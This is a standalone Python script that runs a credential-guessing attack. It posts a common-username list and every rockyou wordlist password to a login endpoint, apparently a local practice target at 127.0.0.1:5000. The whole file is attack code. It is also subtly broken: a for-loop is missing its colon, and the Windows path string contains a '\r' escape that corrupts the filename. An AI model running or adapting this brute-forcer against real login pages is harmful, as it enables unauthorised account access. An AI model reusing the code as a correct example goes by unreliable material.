import requests
import sys

target = "http://127.0.0.1:5000"
usernames = ["admin", "user", "test", "root", "administrator", "dev", "guest"]
passwords = "C:\rockyou.txt"
#needle is the success message, so if we dont see it, it was failure
needle = "Success"

for username in usernames:
    with open(passwords, "r") as passwords_list:
        for password in passwords_list
            # get rid of new line
            password = password.strip("\n").encode()
            # write each attempt
            sys.stdout.write("[X] Attempting user:password -> {}:{}\r".format(username, password.decode()))
            # flush buffer
            sys.stdout.flush()
            r = requests.post(target, data={"username": username, "password": password})
            # check if the needle is in the response
            if needle.encode() in r.content:
                sys.stdout.write("\n")
                sys.stdout.write("\t[>>>>>] Valid password '{}' found for user '{}'!".format(password.decode(), username))
                sys.exit()
        sys.stdout.flush()
        sys.stdout.write("\n")
        sys.stdout.write("\tNo password found for '{}'!".format(username))
        sys.stdout.write("\n")
